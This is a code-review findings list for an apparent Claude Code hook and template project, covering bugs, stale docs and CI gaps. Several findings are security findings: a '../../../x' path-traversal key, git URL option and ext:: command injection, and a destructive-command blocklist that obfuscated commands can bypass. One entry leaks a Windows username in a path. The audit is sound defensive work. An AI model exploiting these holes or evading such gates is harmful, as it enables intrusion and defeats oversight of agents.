- **SHOULD-FIX** — `.claude/lib/shared-memory-lib.sh:128` — sm_write_event builds the destination from producer/key/date with no path-shape guard; keys derived from JSON fields — observation pattern_id and telemetry target_resource ('session:<id>') per shared-memory-produce.sh lines 55/76 — can contain '../' or '/' and write outside .claude/shared-memory/ (which the push layer then commits).
  - evidence: dir="$SM_TREE/$producer/$uuid/$date"; dest="$dir/$key.json" with key taken verbatim from sm_json_field output; an observation file carrying pattern_id "../../../x" escapes the tree. Also breaks the CLAUDE.md 'path-shape guards before mutation' rule; sm_event_exists (line 117) additionally treats glob metacharacters in key as wildcards.
- **COSMETIC** — `.claude/hooks/README.md:8` — Describes sessionstart-rules.sh as 'six jobs in one hook' but the script now has a seventh — the Phase 97 receipt-render --live status-strip refresh
  - evidence: sessionstart-rules.sh:121-127 invokes .claude/scripts/receipt-render.sh --live as an undocumented seventh job; the README's enumerated list (1)-(6) omits it.
- **COSMETIC** — `.claude/hooks/sessionend-cost-proposals.sh:71` — A kill -9 between tmp-file creation and os.replace leaves .tmp.<pid> litter in telemetry/ that is never garbage-collected
  - evidence: tmp = state_path + f'.tmp.{os.getpid()}' (also lines 117, 192); the except-branch cleanup only runs on a caught exception — a hard kill mid-json.dump orphans the file and no later run sweeps *.tmp.* files.
- **COSMETIC** — `.claude/hooks/sessionend-observe.sh:26` — INPUT=$(cat) blocks forever if the hook is run manually from a terminal without redirected stdin
  - evidence: Claude Code always pipes the SessionEnd JSON payload, but a human debugging with 'bash sessionend-observe.sh' hangs on the open tty until Ctrl-D; '[ -t 0 ] || INPUT=$(cat)' style guard would avoid it.
- **COSMETIC** — `.claude/hooks/sessionstart-rules.sh:6` — Header says 'Six pieces of work in one hook' but the body has seven — the Phase 97 receipt-render --live refresh (lines 121-127) is uncounted
  - evidence: Lines 6-28 enumerate jobs 1-6; line 124 adds a seventh invocation (receipt-render.sh --live) documented only by an inline comment.
- **COSMETIC** — `.claude/hooks/sessionstart-rules.sh:55` — jq read of compactPrompt has no stderr suppression or || true, unlike every other sub-step
  - evidence: A malformed .claude/settings.json makes jq print a parse error to the hook's stderr (PROMPT stays empty, hook still completes) — inconsistent with the 2>/dev/null || true discipline used at lines 61/66/71/113.
- **COSMETIC** — `.claude/lib/generate-session-telemetry.sh:20` — Header comment says the observation is written to .claude/observations/token-telemetry-<session_id>.json, but since Phase 65 the code writes <pattern_id>.json (line 479) — stale doc.
  - evidence: Line 20-23 vs line 473-479: obs_path = os.path.join(obs_dir, f'{obs_pid}.json') with a comment explicitly noting the old prefix was removed.
- **COSMETIC** — `.claude/lib/generate-session-telemetry.sh:333` — Events JSONL and session rollup are written non-atomically (open 'w' + incremental writes), so a mid-run kill leaves a truncated file; only the observation uses tmp+os.replace.
  - evidence: with open(events_path, 'w', ...) at 333 and open(rollup_path, 'w', ...) at 430 vs the tmp/os.replace pattern at 515-519. Self-healing on re-run, hence cosmetic.
- **COSMETIC** — `.claude/lib/redact-capture.sh:51` — A UTF-8 BOM at byte 0 makes the ^---\n frontmatter regex fail, so a BOM'd capture is REFUSED (exit 3); sibling readers (receipt-render) open with utf-8-sig.
  - evidence: open(sys.argv[1], encoding="utf-8") + re.match(r"^---\n...") — ﻿ precedes the first ---. Fail-closed direction, so a skip not a leak.
- **COSMETIC** — `.claude/lib/redact-capture.sh:77` — The 32+-char base64 catch-all also mangles legitimate long hex (full sha256/sha1 hashes) into <redacted-b64>, degrading shared body usefulness.
  - evidence: r"[A-Za-z0-9+/]{32,}={0,2}" matches any 40/64-char hex commit hash. Over-redaction is the safe direction, hence cosmetic.
- **COSMETIC** — `.claude/lib/redact-observation.sh:78` — If jq fails inside emit_redacted (e.g. file mutated between the pclass read and the emit), pipefail propagates jq's exit code 2, which collides with the documented 'REFUSED: local-only' code 2 for any caller that switches on codes.
  - evidence: jq -aS ... 2>/dev/null | tr -d '\r' — with set -o pipefail, jq parse failure exits 2; header contract says 2 == local-only. Narrow race only, since a malformed file already fails the pclass read and returns 3.
- **COSMETIC** — `.claude/lib/shared-memory-git.sh:48` — Clone/fetch URL from share-config.json is passed to git without `--` or a scheme allowlist; a URL beginning with '-' is parsed as a git option and an ext:: transport URL executes an arbitrary command.
  - evidence: git clone --quiet "$url" "$dir" (also line 52). The URL is user-authored local config (share-enable), so the attacker must already write .claude/share-config.json — low real exposure, but `git clone -- "$url"` plus an https/ssh scheme check is cheap.

### Wave E findings

- **BLOCKER-for-strangers** — `docs/GETTING-STARTED.md:8` — Governs-the-person phrasing: "it stops you only at the few doors that don't reopen, and when it stops you, it tells you why" — the system acting on the person, twice in one sentence, in the opening frame of the doc.
  - evidence: docs/GETTING-STARTED.md:8-9. What the sentence describes is accurate (the PreToolUse gates on irreversible commands), but the grammatical object being stopped is the reader, which is the governs-the-person register the wedge review targets. Reframe on the action, not the person: "it gates only the few actions that can't be undone, and every gate says why it fired." Reported at the mandated severity for wedge-category hits; if the caller reads "stops you" as plain gate description rather than person-governance, downgrade to SHOULD-FIX.
- **BLOCKER-for-strangers** — `docs/GETTING-STARTED.md:101` — Wedge grep hit: "nudge" — behavior-psychology vocabulary on a stranger-facing surface where the mandate expects zero.
  - evidence: docs/GETTING-STARTED.md:101: "the manager-optimizer nudge (needs draft proposals or a session-count threshold)". The word names a session-start reminder line, so the fix is a rename, not a redesign — "the manager-optimizer reminder line" or "prompt" carries the same meaning without the behavioral-economics term. (This is the only wedge-vocabulary hit across all five files; note the internal hooks README at template/.claude/hooks/README.md:10 uses the same word, so a rename should cover both for consistency, though that file was out of scope.)
- **BLOCKER-for-strangers** — `docs/ROADMAP.md:198` — Literal wedge-grep hit: 'overriding' in 'overriding a deny rule'
  - evidence: 'Disabling a hook, skipping an audit, overriding a deny rule — the user gets explicit language'. Same class as STORY.md:65 and reported per the report-any-hit instruction; same context assessment applies — action-enumeration in the transparency principle, retained through the Phase 84 zero-verdict, likely sanctioned register. Owner adjudication requested rather than assumed.
- **BLOCKER-for-strangers** — `docs/STORY.md:65` — Literal wedge-grep hit: 'overriding' in 'overriding a deny rule'
  - evidence: 'disabling a hook, skipping an audit, overriding a deny rule — the system says it, in plain language'. Reported as BLOCKER per the report-any-hit instruction. Context assessment for the adjudicator: this is an action-enumeration inside the guard-rails-transparency principle (parallel to 'disabling a hook'), not person-behavior-psychology framing, and it survived the Phase 84 sweep that recorded 'widened wedge grep ZERO across README + live docs/' — so it appears to be sanctioned register rather than residue. Owner call needed on whether the bare word is tolerable on a public surface.
- **SHOULD-FIX** — `README.md:41` — "Everything runs from SessionStart and SessionEnd hooks... nothing fires mid-task" is contradicted by the shipped product: two PreToolUse destructive-command gates and a PreCompact backup hook fire mid-task, and GETTING-STARTED.md advertises exactly that on the same stranger path.
  - evidence: README.md:41-42 says "Everything runs from SessionStart and SessionEnd hooks. No cron, no daemons, nothing fires mid-task." But template/.claude/settings.json.template wires four events including PreToolUse (line 32) and PreCompact (line 21); template/.claude/hooks/pretooluse-bash-safety.sh and pretooluse-powershell-safety.sh intercept commands mid-task; docs/GETTING-STARTED.md:25-27 says "7 hook scripts wired across four events... two destructive-command gates on Bash/PowerShell." A skeptical stranger reading both docs sees a direct contradiction. Scope the sentence to the observation features listed above it (e.g. "The watchers all run from SessionStart/SessionEnd; the only mid-task hooks are the two destructive-command gates and the pre-compact backup").
- **SHOULD-FIX** — `docs/GETTING-STARTED.md:13` — Stale count: "a fresh run reports ~82 files" — the template now ships 92 files under .claude/ plus top-level templates, so a fresh install today reports well above 82.
  - evidence: docs/GETTING-STARTED.md:13. Current template/.claude contains 92 files, plus 5 top-level *.template files, 2 docs templates, a .gitignore template, and the generated version marker. The "~" hedge does not cover a ~15-20% drift; re-run install.sh against a scratch repo and transcribe the current number (same fix opportunity as the 13-vs-14 script count — both came from an older-version transcript).
- **SHOULD-FIX** — `docs/GETTING-STARTED.md:20` — Stale count: claims "13 mechanical wrappers" in .claude/scripts/ but the template ships 14.
  - evidence: docs/GETTING-STARTED.md:20-22. Glob of template/.claude/scripts/*.sh returns 14 files — receipt-render.sh (added Phase 103, the --pin receipts card) is the fourteenth and postdates this count. A stranger who counts after install finds the doc off by one on its very first inventory claim.
- **SHOULD-FIX** — `docs/ROADMAP.md:325` — Stale present-tense claim: Tier 3 'plan-mode gate ... Current default' contradicts the shipped Phase 104 default
  - evidence: Both shipped gate-config.json copies (template and dogfood) now set friction.tier_3.lane = 'flow_with_receipt' with the five irreversibility classes (deletion, history_rewrite, config_value_change, template_structural, values_call) as surface_choice overrides — the Phase 104 flip the CHANGELOG records ('the DEFAULT is flow-with-receipt ... in BOTH gate-config copies'). A first-time visitor cross-reading ROADMAP's appendix against the CHANGELOG or the shipped config gets contradictory pictures of the default friction posture. The adjacent line-329 Phase 85 description (docs_only/mechanical_fix overrides, defaults encoding then-current behavior) is framed as history and reads acceptably, but it compounds the pre-104 impression while line 325 stays present-tense. Fix is a truth-mark on 'Current default'.
- **COSMETIC** — `docs/ARCHITECTURE.md:34` — template/.claude/ layout diagram omits several shipped directories and gate-config.json
  - evidence: Diagram shows agents/skills/scripts/commands/hooks/settings.json.template; actual template/.claude/ also ships gate-config.json, lib/, captures/, observations/, recommendations/, specs/, telemetry/. gate-config.json in particular is load-bearing (friction lanes, audits registry) and referenced by ROADMAP, so its absence from the layout is the most noticeable gap.
- **COSMETIC** — `docs/ARCHITECTURE.md:53` — Full-project-layout tree omits template/PLUGINS.md.template, which ships alongside the four templates it does list
  - evidence: Tree lists CLAUDE.md.template, CLAUDE_MANAGER.md.template, ROUTING.md.template, .gitignore.template; actual template/ also contains PLUGINS.md.template. Same tree's docs/ listing names 5 files while docs/ holds ~16, including STORY.md — the identity doc ROADMAP explicitly points readers to — so a stranger cross-checking the tree against the repo sees an incomplete map.
- **COSMETIC** — `docs/PLUGINS-GETTING-STARTED.md:121` — "shipped as the v1.5 flow" invites confusion with install version 1.1.5 for a stranger who hasn't read ROADMAP's tier scheme.
  - evidence: docs/PLUGINS-GETTING-STARTED.md:121 says "shipped as the v1.5 flow above (Phases 76-78)" while the installed version a stranger sees at session start is 1.1.5 (VERSION file, and the GETTING-STARTED transcript). ROADMAP.md does define v1.5 as the ecosystem-integration tier distinct from v1.1.5, so the claim is internally coherent — but on this page there is no gloss, and 'v1.5' vs '1.1.5' differ by one dot. A parenthetical like "(the ROADMAP v1.5 ecosystem tier, not install version 1.1.5)" removes the ambiguity.
- **COSMETIC** — `docs/ROADMAP.md:97` — Path imprecision: 'Ships with scripts/plugin-discovery.sh' points at the wrong directory
  - evidence: Repo-top scripts/ contains only install.sh and update.sh; the shipped script lives at template/.claude/scripts/plugin-discovery.sh (mirrored in .claude/scripts/). A stranger following the stated path finds nothing.

### Wave C findings

- **SHOULD-FIX** — `.claude/agents/05_meta/session-observer.schema.md:20` — task-watchdog observation baea6a01… has its 4 evidence events duplicated verbatim (entries 0-3 == 4-7) and occurrences: 8 double-counts them — the 'known watchdog duplication bug' named in capture fe22198… is still live on disk.
  - evidence: .claude/observations/baea6a01b67690e5…json evidence[0]/[4], [1]/[5], [2]/[6], [3]/[7] are byte-identical pairs; capture fe22198210607aea…md line 16-17 admits 'the evidence array carries each event twice — known watchdog duplication bug, flagged for its own phase'.
- **SHOULD-FIX** — `.claude/agents/05_meta/session-observer.schema.md:21` — 52 of 249 observations (49 session-end-telemetry, 3 task-watchdog) violate the declared YYYY-MM-DDTHH:MM:SSZ timestamp format with millisecond timestamps in first_seen/last_seen/evidence.
  - evidence: e.g. .claude/observations/01144d0a…json first_seen: "2026-05-19T21:42:39.232Z"; baea6a01…json all 8 evidence timestamps carry .NNN milliseconds. Producers emit a format the schema forbids — either fix the producers or widen the schema's stated format.
- **SHOULD-FIX** — `.claude/agents/05_meta/session-observer.schema.md:50` — Redaction rules only strip POSIX '/Users/<u>/…' home paths; Windows home paths pass the filter and real evidence leaks the username — on the platform this project actually runs on.
  - evidence: .claude/observations/baea6a01…json evidence[1].args_redacted contains 'C:\Users\darre\AppData\Local\Temp\claude\…' verbatim; the observation is privacy_class share-with-redaction, so this string is in the class that can leave the project boundary.
- **SHOULD-FIX** — `.github/test-fixtures/scenarios.sh:179` — fresh-install's existing-install leg can false-pass: the update.sh run is `|| true`-masked and the two follow-up checks are absence-only (.first-run absent, welcome not printed) — both hold trivially if update.sh dies before doing anything.
  - evidence: `bash .../update.sh ... > /dev/null 2>&1 || true` followed by `[ ! -f .first-run ]` and `grep -q "First session"` negative check on hout3; a syntax error or early exit in update.sh leaves both assertions vacuously green. A single positive assertion on update.sh output would close it.
- **SHOULD-FIX** — `.github/test-fixtures/scenarios.sh:1177` — local-mod-preserve can false-pass: update.sh exit is masked with `|| true` and the only assertion is that the file hash did NOT change — a crash-at-startup update.sh also changes nothing, so the scenario passes vacuously.
  - evidence: `printf 'k\n' | bash ... update.sh ... || true` then only `[ "$hash_after" != "$hash_before" ] -> ERROR`; no assert_contains on update.out proving the LOCALLY_MODIFIED prompt was ever reached (contrast raw-baseline-migrate line 1250 which asserts positive output). Fix: assert_contains "$(cat update.out)" "locally modified files:       1".
- **SHOULD-FIX** — `.github/workflows/ci.yml:14` — The weekly scheduled full-matrix drift net shares concurrency group `ci-${{ github.ref }}` (refs/heads/main) with ordinary pushes, and cancel-in-progress: true means a Monday-morning push to main cancels the in-progress weekly run (and vice versa) — the drift net is lost with no failure signal.
  - evidence: Both `schedule` and `push` on main resolve to group `ci-refs/heads/main`; GitHub cancels the older run regardless of triggering event. Fix: `group: ci-${{ github.event_name }}-${{ github.ref }}` or exempt schedule runs from cancellation.
- **SHOULD-FIX** — `.github/workflows/ci.yml:49` — Portability detection diffs only the last commit of a push (`git diff HEAD^ HEAD` with fetch-depth: 2), so a multi-commit push whose earlier commits touched scripts/hooks/lib but whose tip commit did not runs linux-only — the windows/macos matrix is silently skipped for exactly the surfaces it guards.
  - evidence: Push `A(edits scripts/install.sh) + B(docs tweak)` to main: HEAD^..HEAD sees only B's docs change -> os_list=linux. Fix: diff `${{ github.event.before }}..HEAD` (with the existing fail-open when `before` is all-zeros/unreachable), fetching enough depth.
- **SHOULD-FIX** — `template/.claude/settings.json.template:5` — Fresh installs get blanket auto-approval of Bash/PowerShell/Edit/Write with defaultMode 'default'; the only destructive gate is the pattern-matching PreToolUse blocklist, which is bypassable by construction (obfuscated/novel command shapes).
  - evidence: allow list contains bare "Bash" and "PowerShell" (lines 6-7); the hard floor is gate-config's destructive_pattern_floor citing .claude/lib/destructive-bash-patterns.sh — a blocklist, not an allowlist. Deliberate Phase 104 flow-with-receipt design, but a stranger installing the template should meet this trade-off in install docs or get a prompting default with an opt-in to flow.
- **SHOULD-FIX** — `template/CLAUDE.md.template:7` — Companion-surface link `docs/ROADMAP.md` is dead in every fresh install — template/docs/ ships only ARCHITECTURE/SESSION_LOG/STATUS templates, no ROADMAP.
  - evidence: ls template/docs/ → ARCHITECTURE.md.template, SESSION_LOG.md.template, STATUS.md.template only; nothing in the install path creates docs/ROADMAP.md, so line 7's '[`docs/ROADMAP.md`](docs/ROADMAP.md) carries the locked architectural principles' points at a nonexistent file until a user hand-creates one.
- **SHOULD-FIX** — `template/CLAUDE.md.template:38` — Closing line promises an audit triad including `cruft-checker`, but cruft-checker is dogfood-only — template ships no cruft-checker agent, no cruft-check.sh, and no SessionStart wiring for it.
  - evidence: template/.claude/agents/05_meta/code-quality-auditor.md:11 states 'unlike `cruft-checker`, which is dogfood-only'; template/.claude/scripts/ has no cruft-check.sh and settings.json.template's SessionStart chain omits it. A target install's constitution describes a watchdog it doesn't have.
- **COSMETIC** — `.claude/agents/05_meta/session-observer.schema.md:33` — target_resource category 'tool' (baea6a01… uses 'tool:Bash') is not in the registered category list (agent/skill/command/script/plugin/hook/file/session).
  - evidence: Schema line 33 enumerates eight categories; 'tool' is absent. Either register it or re-key the watchdog's emission.
- **COSMETIC** — `.claude/agents/05_meta/session-observer.schema.md:43` — 4 observations exceed the 120-char caps: manual notes at 615 and 589 chars, manual evidence summaries at 141-208 chars, roadmap-auditor evidence summaries up to 232 chars — the truncate-with-ellipsis rule is not applied by hand-written or roadmap-auditor emissions.
  - evidence: 917948cf…json notes=615 chars; d7a4a948…json notes=589; 6708b966…json summaries 141/207; ddee6613…json (roadmap-auditor) summaries 164/197/232.
- **COSMETIC** — `.claude/agents/05_meta/session-observer.schema.md:141` — token_telemetry observations carry ~8 extra fields (total_tokens_in/out, total_cache_creation/read, turns_with_usage, useful_units_drafted/shipped, tokens_per_useful_unit, data_available) that the schema doc never registers.
  - evidence: 01144d0a…json lines 3, 20-27. Permitted by the extensibility note ('add a new optional field with a clear name') but the schema's own rule is that new fields are added to the doc — these never were.
- **COSMETIC** — `.claude/agents/05_meta/workflow-suggester.schema.md:53` — Real artifact nit: capture fe22198…md's Approving/rejecting section still reads 'Edit `status: draft` above to `approved`' while its frontmatter status is already `shipped` — the lifecycle instructions weren't updated at promote.
  - evidence: .claude/captures/fe22198210607aea…md line 39 vs frontmatter line 5 (status: shipped). Harmless (idempotency keys off status, not body text) but the file contradicts itself.
- **COSMETIC** — `.claude/specs/goal-spec.schema.md:22` — The real spec appends a sixth section, '## Consumption record', that the schema's 5-section body doesn't define — useful content (landing commits for both legs) with no schema-sanctioned home.
  - evidence: .claude/specs/propagate-skeleton-tv-eog.md:78. Consider registering an optional consumption-record section for status: consumed, since the first real consumed spec already needed one.
- **COSMETIC** — `.github/test-fixtures/scenarios.sh:54` — verify_marker's default expected_count of 25 is stale — every caller passes 81; the dead default invites a wrong-count assertion if a future call site omits the argument (it would fail loudly, not silently, so no false-pass).
  - evidence: `local expected_count="${1:-25}"` at line 54; only invocations are `verify_marker 81` (lines 111, 1216) and raw-baseline checks hardcoding 81 (lines 1272). Drop the default or update it to 81.
- **COSMETIC** — `.github/test-fixtures/scenarios.sh:690` — A few `git ls-tree -r | grep -q` pipelines contradict the file's own have_glob rationale (avoiding early-close SIGPIPE under pipefail); with ~90 paths the output fits the pipe buffer so it cannot realistically trip, but the pattern is inconsistent with lines 92-100.
  - evidence: Lines 690, 736, 825 pipe `git ls-tree -r --name-only` into `grep -q` under `set -euo pipefail`; the helper comment at line 92 exists specifically to avoid this shape.
- **COSMETIC** — `.github/test-fixtures/scenarios.sh:1409` — Python-missing SKIP paths report as PASS: watchdog-transcript-resolution / watchdog-dedup-reobserve exit 0 from the subshell on SKIP and the outer function still echoes "PASS <scenario>", so a runner without python shows a green PASS line for a test that never ran.
  - evidence: `[ -n "$pybin" ] || { echo "SKIP ..."; exit 0; }` inside `( ... )` at lines 1409 and 1498; execution falls through to `echo "PASS watchdog-transcript-resolution"` (line 1465). Low practical risk since ci.yml installs Python 3.11, but the output is misleading.
- **COSMETIC** — `.github/test-fixtures/scenarios.sh:3069` — Redundant tautology in the help branch: `[ -z "${1:-}" ] && exit 0 || exit 0` exits 0 on both sides — the test expression is dead code.
  - evidence: Line 3069; equivalent to plain `exit 0`. Harmless (CI never invokes with an empty arg), just noise.
- **COSMETIC** — `.github/workflows/ci.yml:59` — The test job has no timeout-minutes; 51 sequential scenarios that each run full installs plus git operations would consume the 360-minute default before a hang is surfaced.
  - evidence: No `timeout-minutes:` anywhere in the workflow; a wedged interactive prompt in update.sh (stdin not always redirected inside scenarios) would burn runner minutes until GitHub's 6-hour default kills it.

## Wave G — close

*(summary lands here at close: findings by wave and severity; the BLOCKER list as the pre-sharing punch list; ledger 100% verification)*
